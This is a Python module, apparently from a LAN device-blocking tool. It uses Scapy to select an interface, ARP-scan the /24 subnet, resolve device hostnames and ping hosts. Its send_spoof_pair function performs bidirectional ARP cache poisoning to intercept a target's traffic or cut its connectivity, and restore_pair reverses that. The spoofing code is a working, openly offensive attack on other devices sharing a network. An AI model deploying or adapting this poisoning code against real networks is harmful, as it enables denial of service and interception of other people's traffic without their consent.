"""
Network operations: interface selection, ARP scanning, hostname resolution, ping, and ARP spoofing.

All functions in this module are pure network operations with no UI dependencies.
They are designed to be called from background threads in the application layer.
"""

from __future__ import annotations

import re
import socket
import subprocess
import threading

from scapy.all import (
    ARP, Ether, srp, sendp, getmacbyip,
    conf, get_if_addr, get_if_hwaddr
)


def select_interface(gateway_ip: str) -> tuple[str, str, str]:
    """Return the interface name, local IP, and local MAC that route to the given gateway IP.

    Uses Scapy's routing table to pick the correct interface. Falls back to the
    Scapy default interface if the routing lookup fails.
    """
    try:
        iface = conf.route.route(gateway_ip)[0]
    except Exception:
        iface = conf.iface

    local_ip = get_if_addr(iface) or gateway_ip

    try:
        local_mac = get_if_hwaddr(iface)
    except Exception:
        local_mac = ""

    return iface, local_ip, local_mac


def resolve_gateway_mac(gateway_ip: str) -> str:
    """Resolve the MAC address of the gateway via a live ARP request.

    Falls back to reading the OS ARP cache if the live request returns nothing.
    Returns an empty string when the MAC cannot be determined by either method.
    """
    try:
        mac = getmacbyip(gateway_ip) or ""
    except Exception:
        mac = ""

    if not mac:
        mac = _mac_from_arp_cache(gateway_ip)

    return mac


def _mac_from_arp_cache(ip: str) -> str:
    """Return the cached MAC address for the given IP by reading the OS ARP table."""
    try:
        out = subprocess.check_output(
            ["arp", "-n", ip], stderr=subprocess.DEVNULL, text=True)
        for token in out.split():
            if re.match(r"^([0-9a-f]{1,2}:){5}[0-9a-f]{1,2}$", token, re.I):
                return token
    except Exception:
        pass
    return ""


def scan_subnet(gateway_ip: str, iface: str, local_ip: str) -> list[tuple[str, str]]:
    """Broadcast an ARP request across the /24 subnet and return a list of (ip, mac) pairs.

    Excludes the gateway address, broadcast addresses, and the calling machine's own IP.
    Raises PermissionError if the process lacks the privilege to send raw Layer 2 packets.
    """
    subnet = ".".join(gateway_ip.split(".")[:3]) + ".0/24"
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet, psrc=local_ip),
        iface=iface, timeout=3, verbose=False
    )
    return [
        (r.psrc, r.hwsrc) for _, r in ans
        if r.psrc != gateway_ip and not r.psrc.endswith(".255")
    ]


def arp_cache_fallback(gateway_ip: str) -> list[tuple[str, str]]:
    """Read the OS ARP cache and return (ip, mac) pairs on the same /24 as the gateway.

    Used when the live ARP sweep returns no results. This can happen when AP isolation
    is enabled on the access point, preventing Layer 2 broadcast frames from reaching
    other connected clients.
    """
    prefix = ".".join(gateway_ip.split(".")[:3]) + "."
    found  = []
    try:
        out = subprocess.check_output(
            ["arp", "-an"], stderr=subprocess.DEVNULL, text=True)
        for line in out.splitlines():
            m = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-f:]+)', line, re.I)
            if not m:
                continue
            ip, mac = m.group(1), m.group(2).lower()
            if (ip == gateway_ip
                    or ip.endswith(".255")
                    or mac in ("ff:ff:ff:ff:ff:ff", "(incomplete)")
                    or not ip.startswith(prefix)
                    or mac.startswith("01:")
                    or mac.startswith("1:")):
                continue
            found.append((ip, mac))
    except Exception:
        pass
    return found


def bulk_hostnames() -> dict[str, str]:
    """Run 'arp -a' without the -n flag and return a mapping of IP address to hostname.

    Without the -n flag, macOS resolves Bonjour/mDNS names in the ARP output, providing
    device names such as "Muhammads-iPhone" or "Galaxy-S22" at no extra network cost.
    Entries where the hostname equals the IP or starts with '?' are skipped.
    """
    names: dict[str, str] = {}
    try:
        out = subprocess.check_output(
            ["arp", "-a"], stderr=subprocess.DEVNULL, text=True, timeout=5)
        for line in out.splitlines():
            # Expected format: "Muhammads-iPhone (192.168.x.x) at aa:bb:cc on en0 ..."
            # Unknown entries look like:  "? (192.168.x.x) at ..."
            m = re.match(r'^([^?\s]\S*)\s+\((\d+\.\d+\.\d+\.\d+)\)', line)
            if m:
                host, ip = m.group(1), m.group(2)
                host = re.sub(r'\.local$', '', host, flags=re.I)
                if host and host != ip:
                    names[ip] = host
    except Exception:
        pass
    return names


def resolve_hostname(ip: str, timeout: float = 3.0) -> str:
    """Perform a reverse DNS/mDNS lookup for the given IP address.

    The lookup is run on a daemon thread with a hard timeout so the caller is never
    blocked indefinitely. Returns the resolved hostname with the '.local' suffix
    stripped, or an empty string when resolution fails or times out.
    """
    result: list[str | None] = [None]

    def _lookup() -> None:
        try:
            result[0] = socket.gethostbyaddr(ip)[0]
        except Exception:
            pass

    t = threading.Thread(target=_lookup, daemon=True)
    t.start()
    t.join(timeout=timeout)

    if result[0] and result[0] != ip:
        return re.sub(r'\.local$', '', result[0], flags=re.I)
    return ""


def ping(ip: str) -> int | None:
    """Send a single ICMP echo request and return the round-trip time in milliseconds.

    Returns None if the host does not respond or the system ping command fails.
    Uses a 1-second wait limit and a TTL of 1 to keep latency measurements tight.
    """
    try:
        out = subprocess.check_output(
            ["ping", "-c", "1", "-W", "1000", "-t", "1", ip],
            stderr=subprocess.DEVNULL, text=True)
        m = re.search(r'time[=<]([\d.]+)', out)
        return int(float(m.group(1))) if m else None
    except Exception:
        return None


def send_spoof_pair(target_ip: str, target_mac: str, gateway_ip: str,
                    gateway_mac: str, iface: str, attacker_mac: str) -> None:
    """Send one round of bidirectional ARP poisoning to intercept a target device's traffic.

    Packet 1 is addressed to the target and tells it that the attacker's MAC is the gateway,
    so all outbound traffic from the target is routed through the attacker instead.
    Packet 2 is addressed to the gateway and tells it that the attacker's MAC is the target,
    so all inbound traffic destined for the target is routed through the attacker instead.
    Both sides must be poisoned simultaneously to cut connectivity completely.
    """
    arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    if attacker_mac:
        arp1.hwsrc = attacker_mac
    sendp(Ether(dst=target_mac) / arp1, iface=iface, verbose=False)

    if gateway_mac:
        arp2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        if attacker_mac:
            arp2.hwsrc = attacker_mac
        sendp(Ether(dst=gateway_mac) / arp2, iface=iface, verbose=False)


def restore_pair(target_ip: str, target_mac: str, gateway_ip: str,
                 gateway_mac: str, iface: str, count: int = 5) -> None:
    """Send corrective ARP replies to overwrite poisoned cache entries on both the target
    and the gateway, restoring normal traffic flow after a block is lifted.

    Sending multiple packets in quick succession ensures the correction takes effect
    before either device issues new ARP requests and receives a poisoned reply again.
    """
    try:
        sendp(
            Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac),
            iface=iface, count=count, verbose=False
        )
        if gateway_mac:
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=target_mac),
                iface=iface, count=count, verbose=False
            )
    except Exception:
        pass
